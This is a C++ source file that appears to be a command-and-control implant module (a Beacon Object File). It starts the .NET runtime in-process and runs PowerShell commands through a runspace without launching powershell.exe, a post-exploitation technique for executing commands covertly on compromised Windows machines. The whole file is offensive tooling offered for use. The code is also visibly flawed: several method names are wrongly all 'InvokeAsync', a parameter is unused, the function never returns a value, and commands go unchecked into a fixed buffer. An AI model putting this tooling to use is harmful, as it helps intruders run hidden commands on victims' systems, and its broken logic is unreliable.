#include <General.hpp>

auto Dotnet::Pwsh(
    _In_     WCHAR* Command,
    _In_opt_ WCHAR*  Script
) -> HRESULT {
    HRESULT HResult = S_OK;

    LONG lLower, lUpper;
    LONG  ArgIdx = 0;
    BYTE* Output = nullptr;
    ULONG OutLen = 0;
    BOOL  IsBl   = FALSE;

    IType* PipelineHdrType = nullptr;
    IType* CmdCollectType  = nullptr;
    IType* PipelineType    = nullptr;
    IType* RunspaceType    = nullptr;
    IType* ReflectionType  = nullptr;
    IType* RunsFactoryType = nullptr;

    IMethodInfo* AddScriptMethod      = nullptr;
    IMethodInfo* ReflectionMethod     = nullptr;
    IMethodInfo* CreateRunspace       = nullptr;
    IMethodInfo* RunsFactoryMethod    = nullptr;
    IMethodInfo* CreatePipelineMethod = nullptr;

    VARIANT VarCommands = { 0 };
    VARIANT VarPipe     = { 0 };
    VARIANT VarOutput   = { 0 };
    VARIANT VarArgv     = { 0 };
    VARIANT VarParam    = { 0 };
    VARIANT VarResult   = { 0 };

    WCHAR FmVersion[MAX_PATH] = { 0 };
    ULONG FmBuffLen = MAX_PATH;

    IBindingFlags BindFlags_1 = (IBindingFlags)( IBindingFlags::BindingFlags_NonPublic | IBindingFlags::BindingFlags_Public | IBindingFlags::BindingFlags_Static | IBindingFlags::BindingFlags_FlattenHierarchy | IBindingFlags::BindingFlags_Instance );
    IBindingFlags BindFlags_2 = (IBindingFlags)( IBindingFlags::BindingFlags_Public | IBindingFlags::BindingFlags_Static | IBindingFlags::BindingFlags_FlattenHierarchy );
    IBindingFlags BindFlags_3 = (IBindingFlags)( IBindingFlags::BindingFlags_Public | IBindingFlags::BindingFlags_Static | IBindingFlags::BindingFlags_FlattenHierarchy );

    SAFEARRAYBOUND SafeBound   = { 0 };
    SAFEARRAY*     SafePipeArg = { nullptr };
    SAFEARRAY*     SafeAsms    = { nullptr };
    SAFEARRAY*     SafeMethods = { nullptr };
    SAFEARRAY*     SafeAsm     = { nullptr };
    SAFEARRAY*     SafeExpc    = { nullptr };
    SAFEARRAY*	   SafeArgs    = { nullptr };

    IUnknown*        AppDomThunk = { nullptr };
    IUnknown*        EnumRtm     = { nullptr };
    IEnumUnknown*    EnumUkwn    = { nullptr };
    IAssembly*       Automation  = { nullptr };
    IAssembly*       Mscorlib    = { nullptr }; 
    IAppDomain*      AppDom      = { nullptr };
    ICLRMetaHost*    MetaHost    = { nullptr };
    ICLRRuntimeInfo* RtmInfo     = { nullptr };
    ICorRuntimeHost* RtmHost     = { nullptr };

    BSTR PipelineHdrBstr    = SysAllocString( L"InvokeAsync" );
    BSTR GetOutBstr         = SysAllocString( L"InvokeAsync" );
    BSTR InvokeAsyncBstr    = SysAllocString( L"InvokeAsync" );
    BSTR AddScriptBstr      = SysAllocString( L"AddScript" );
    BSTR CmdCollectBstr     = SysAllocString( L"System.Management.Automation.Runspaces.CommandCollection" );
    BSTR GetCmdBstr         = SysAllocString( L"get_Commands" );
    BSTR PipelineBstr       = SysAllocString( L"System.Management.Automation.Runspaces.Pipeline" );
    BSTR CreateRunspaceBstr = SysAllocString( L"CreateRunspace" );
    BSTR RunspaceFactBstr   = SysAllocString( L"System.Management.Automation.Runspaces.RunspaceFactory" );
    BSTR ReflectAsmBstr     = SysAllocString( L"System.Reflection.Assembly" );
    BSTR LoadPartNameBstr   = SysAllocString( L"LoadWithPartialName" );
    BSTR OpenBstr           = SysAllocString( L"Open" );
    BSTR CreatePipelineBstr = SysAllocString( L"CreatePipeline" );
    BSTR SysManBstr         = SysAllocString( L"System.Management.Automation.Runspaces.Runspace" );

    HResult = CLRCreateInstance( CLSID.CLRMetaHost, IID.ICLRMetaHost, (VOID**)&MetaHost );
    if ( FAILED( HResult ) || !MetaHost ) {
        BeaconPrintf( CALLBACK_OUTPUT, "[x] failed on instance the clr: %X", HResult ); return HResult;
    }

    HResult = MetaHost->EnumerateInstalledRuntimes( &EnumUkwn );
    if ( FAILED( HResult ) ) {
        BeaconPrintf( CALLBACK_OUTPUT, "[x] failed to enumerate installed framework versions: %X", HResult ); return HResult;
    }

    while ( ( EnumUkwn->Next( 1, &EnumRtm, 0 ) == S_OK ) ) {
        if ( ! EnumRtm ) continue;

        if ( SUCCEEDED( EnumRtm->QueryInterface( IID.ICLRRuntimeInfo, (VOID**)&RtmInfo ) ) && RtmInfo ) {
            if ( SUCCEEDED( RtmInfo->GetVersionString( FmVersion, &FmBuffLen ) ) ) {
                BeaconPrintf( CALLBACK_OUTPUT, "[+] supported version: %S", FmVersion );
            }
        }
    }

    BeaconPrintf( CALLBACK_OUTPUT, "[+] using last version: %S", FmVersion );

    HResult = MetaHost->GetRuntime( FmVersion, IID.ICLRRuntimeInfo, (VOID**)&RtmInfo );
    if ( FAILED( HResult ) ) {
        BeaconPrintf( CALLBACK_OUTPUT, "[x] failed: %X", HResult ); return HResult;
    }

    HResult = RtmInfo->IsLoadable( &IsBl );
    if ( FAILED( HResult ) ) {
        BeaconPrintf( CALLBACK_OUTPUT, "[x] failed: %X", HResult ); return HResult;
    }

    BeaconPrintf( CALLBACK_OUTPUT, "[+] is loadable: %s", IsBl ? "true" : "false"  );

    HResult = RtmInfo->GetInterface( CLSID.CorRuntimeHost, IID.ICorRuntimeHost, (VOID**)&RtmHost );
    if ( FAILED( HResult ) ) {
        BeaconPrintf( CALLBACK_OUTPUT, "[x] failed: %X", HResult ); return HResult;
    }

    HResult = RtmHost->Start();
    if ( FAILED( HResult ) ) {
        BeaconPrintf( CALLBACK_OUTPUT, "[x] failed: %X", HResult ); return HResult;
    }

    BeaconPrintf( CALLBACK_OUTPUT, "[+] started!" );

    HResult = RtmHost->GetDefaultDomain( &AppDomThunk );
    if ( FAILED( HResult ) ) {
        BeaconPrintf( CALLBACK_OUTPUT, "[x] failed: %X", HResult ); return HResult;
    }

    HResult = AppDomThunk->QueryInterface( IID.AppDomain, (VOID**)&AppDom );
    if ( FAILED( HResult ) ) {
        BeaconPrintf( CALLBACK_OUTPUT, "[x] failed: %X", HResult ); return HResult;
    }

    HResult = GetAssemblyLoaded( AppDom, L"mscorlib", IID.MscorlibAsm, &Mscorlib );
    if ( FAILED( HResult ) ) {
        BeaconPrintf( CALLBACK_OUTPUT, "[x] failed: %X", HResult ); return HResult;
    }

    HResult = Mscorlib->GetType_2( ReflectAsmBstr, &ReflectionType );
    if ( FAILED( HResult ) ) {
        BeaconPrintf( CALLBACK_OUTPUT, "[x] Failed to get System.Reflection.Assembly type: 0x%08X", HResult); return HResult;
    }

    HResult = GetMethodType( BindFlags_1, ReflectionType, LoadPartNameBstr, &ReflectionMethod );
    if ( FAILED( HResult ) ) {
        BeaconPrintf( CALLBACK_OUTPUT, "[x] failed: %X", HResult ); return HResult;
    }
 
    VariantInit( &VarParam  );
    VariantInit( &VarResult );

    SafeArgs = SafeArrayCreateVector( VT_VARIANT, 0 , 1 );

    VarParam.vt      = VT_BSTR;
    VarParam.bstrVal = SysAllocString( L"System.Management.Automation" );
    if ( ! VarParam.bstrVal ) return HResult;

    SafeArrayPutElement( SafeArgs, &ArgIdx, &VarParam );

    HResult = ReflectionMethod->Invoke_3( VARIANT(), SafeArgs, &VarResult );
    if ( FAILED( HResult ) ) {
        BeaconPrintf( CALLBACK_OUTPUT, "[x] failed: %X", HResult ); return HResult;
    }
 
    Automation = (IAssembly*)VarResult.byref;
    if ( Automation ) {
        Automation->AddRef();
    }

    HResult = Automation->GetType_2( RunspaceFactBstr, &RunsFactoryType );
    if ( FAILED( HResult ) ) {
        BeaconPrintf( CALLBACK_OUTPUT, "[x] failed: %X", HResult ); return HResult;
    }

    HResult = GetMethodType( BindFlags_1, RunsFactoryType, CreateRunspaceBstr, &CreateRunspace );
    if ( FAILED( HResult ) ) {
        BeaconPrintf( CALLBACK_OUTPUT, "[x] failed: %X", HResult ); return HResult;
    }

    VARIANT VarCreateRunsp = { 0 };

    HResult = CreateRunspace->Invoke_3( VARIANT(), nullptr, &VarCreateRunsp );
    if ( FAILED( HResult ) ) {
        BeaconPrintf( CALLBACK_OUTPUT, "[x] failed: %X", HResult ); return HResult;
    }

    HResult = Automation->GetType_2( SysManBstr, &RunspaceType );
    if ( FAILED( HResult ) ) {
        BeaconPrintf(CALLBACK_OUTPUT, "Failed to get type of Runspace: 0x%08X", HResult); return HResult;
    }

    HResult = RunspaceType->InvokeMember_3(
        OpenBstr, (IBindingFlags)(IBindingFlags::BindingFlags_NonPublic | IBindingFlags::BindingFlags_Public | IBindingFlags::BindingFlags_Instance | IBindingFlags::BindingFlags_InvokeMethod), 
        nullptr, VarCreateRunsp, nullptr, nullptr
    );
    if ( FAILED( HResult ) ) {
        BeaconPrintf(CALLBACK_OUTPUT, "[x] Failed to Open() runspace: 0x%08X", HResult);
        return HResult;
    }

    BeaconPrintf( CALLBACK_OUTPUT, "Open invoked" );

    SafePipeArg = SafeArrayCreateVector( VT_VARIANT, 0, 0 );

    HResult = Automation->GetType_2( PipelineBstr, &PipelineType );
    if ( FAILED( HResult ) ) {
        BeaconPrintf( CALLBACK_OUTPUT, "[x] failed: %X", HResult ); return HResult;
    }

    HResult = GetMethodType( (IBindingFlags)( IBindingFlags::BindingFlags_Public | IBindingFlags::BindingFlags_Instance ), RunspaceType, CreatePipelineBstr, &CreatePipelineMethod );
    if ( FAILED( HResult ) ) {
        BeaconPrintf( CALLBACK_OUTPUT, "[x] failed: %X", HResult ); return HResult;
    }    

    HResult = CreatePipelineMethod->Invoke_3( VarCreateRunsp, nullptr, &VarPipe);
    if (FAILED(HResult)) {
        BeaconPrintf(CALLBACK_OUTPUT, "Failed to create pipeline: 0x%08X", HResult);
        return HResult;
    }

    // // After CreatePipelineMethod->Invoke_3
    // if (VarPipe.vt == VT_UNKNOWN || VarPipe.vt == VT_DISPATCH) {
    //     IDispatch* pDisp = nullptr;
    //     if (VarPipe.vt == VT_UNKNOWN) {
    //         HResult = VarPipe.punkVal->QueryInterface( this->IID.IDispatch, (void**)&pDisp );
    //     } else {
    //         pDisp = VarPipe.pdispVal;
    //         pDisp->AddRef(); // Keep reference if we use it
    //     }

    //     if (SUCCEEDED(HResult) && pDisp) {
    //         // Use pDisp for your operations
    //         // When done:
    //         pDisp->Release();
    //     } else {
    //         BeaconPrintf("CALLBACK_OUTPUT, [x] Failed to get IDispatch from pipeline: 0x%08X", HResult);
    //         return HResult;
    //     }
    // } else {
    //     BeaconPrintf("CALLBACK_OUTPUT, [x] Unexpected VarPipe type: %d", VarPipe.vt);
    //     return E_NOINTERFACE;
    // }

    auto flags = (IBindingFlags)(
        IBindingFlags::BindingFlags_NonPublic | IBindingFlags::BindingFlags_Instance |
        IBindingFlags::BindingFlags_Public | IBindingFlags::BindingFlags_InvokeMethod
    );

    HResult = PipelineType->InvokeMember_3( GetCmdBstr, flags, nullptr, VarPipe, nullptr, &VarCommands );
    if ( FAILED( HResult ) ) {
        BeaconPrintf( CALLBACK_OUTPUT, "[x] failed: %X", HResult ); return HResult;
    }   

    HResult = Automation->GetType_2( CmdCollectBstr, &CmdCollectType );
    if ( FAILED( HResult ) ) {
        BeaconPrintf( CALLBACK_OUTPUT, "[x] failed: %X", HResult ); return HResult;
    }   
    
    WCHAR FinalCmd[MAX_PATH*2] = { 0 };

    Str::ConcatW( FinalCmd, Command );
    Str::ConcatW( FinalCmd, L" | Out-String" );

    VARIANT VarCmd;
    VariantInit(&VarCmd);
    VarCmd.vt = VT_BSTR;
    VarCmd.bstrVal = SysAllocString(FinalCmd); // Allocate BSTR

    SafeArgs = SafeArrayCreateVector(VT_VARIANT, 0, 1);
    LONG index = 0;
    SafeArrayPutElement(SafeArgs, &index, &VarCmd);

    if (!SafeArgs || SafeArrayGetDim(SafeArgs) != 1) {
        BeaconPrintf(CALLBACK_OUTPUT, "[x] SafeArray creation failed");
        return E_FAIL;
    }

    // if (VarCommands.vt != VT_DISPATCH || !VarCommands.pdispVal) {
    //     BeaconPrintf("CALLBACK_OUTPUT, [x] VarCommands invalido (VT=%d)", VarCommands.vt);
    //     SafeArrayDestroy(SafeArgs);
    //     return E_INVALIDARG;
    // }

    GetMethodType( BindFlags_1, CmdCollectType, AddScriptBstr, &AddScriptMethod );
    
    HResult = AddScriptMethod->Invoke_3( VarCommands, SafeArgs, nullptr );
    if ( FAILED( HResult ) ) {
        BeaconPrintf( CALLBACK_OUTPUT, "[x] failed: %X", HResult ); return HResult;
    }   

    HResult = PipelineType->InvokeMember_3( InvokeAsyncBstr, flags, nullptr, VarPipe, nullptr, nullptr );
    if ( FAILED( HResult ) ) {
        BeaconPrintf( CALLBACK_OUTPUT, "[x] failed: %X", HResult ); return HResult;
    }   

    HResult = PipelineType->InvokeMember_3( GetOutBstr, flags, nullptr, VarPipe, nullptr, &VarOutput );
    if ( FAILED( HResult ) ) {
        BeaconPrintf( CALLBACK_OUTPUT, "[x] failed: %X", HResult ); return HResult;
    }   

    HResult = Automation->GetType_2( PipelineHdrBstr, &PipelineHdrType );
    if ( FAILED( HResult ) ) {
        BeaconPrintf( CALLBACK_OUTPUT, "[x] failed: %X", HResult ); return HResult;
    }   
}